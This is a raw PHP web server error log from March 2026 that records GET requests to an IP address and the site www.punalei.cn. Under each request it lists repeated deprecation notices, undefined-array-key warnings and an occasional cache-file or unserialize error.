[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T08:47:34+08:00 ] 66.132.153.143 GET 120.24.147.77/favicon.ico
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:47:34+08:00 ] 66.132.153.143 GET 120.24.147.77/favicon.ico
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:48:52+08:00 ] 66.132.153.143 GET 120.24.147.77/login
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:48:52+08:00 ] 66.132.153.143 GET 120.24.147.77/login
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:49:28+08:00 ] 167.94.146.53 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T08:49:30+08:00 ] 167.94.146.53 GET 120.24.147.77/favicon.ico
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:49:30+08:00 ] 167.94.146.53 GET 120.24.147.77/favicon.ico
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:49:34+08:00 ] 167.94.146.53 GET 120.24.147.77/security.txt
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:49:34+08:00 ] 167.94.146.53 GET 120.24.147.77/security.txt
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:51:43+08:00 ] 47.92.235.72 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:07:16+08:00 ] 85.217.149.43 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:11:15+08:00 ] 52.167.144.227 GET www.punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:46+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:46+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:47+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T09:13:47+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:47+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:47+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:47+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:47+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:48+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]file_get_contents(/www/wwwroot/punalei/runtime/cache/bb/4d2c7c184a0a1ab2d29f7029af4079.php): Failed to open stream: No such file or directory
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:48+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T09:13:48+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]file_get_contents(/www/wwwroot/punalei/runtime/cache/bb/4d2c7c184a0a1ab2d29f7029af4079.php): Failed to open stream: No such file or directory
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:48+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:49+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:49+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:49+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8]unserialize(): Error at offset 24532 of 24544 bytes
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:49+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T09:13:49+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:49+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]file_get_contents(/www/wwwroot/punalei/runtime/cache/bb/4d2c7c184a0a1ab2d29f7029af4079.php): Failed to open stream: No such file or directory
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:49+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:50+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:50+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:50+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:50+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:50+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:50+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T09:13:50+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:51+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:51+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:51+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:51+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:51+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:51+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:51+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T09:13:52+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:52+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
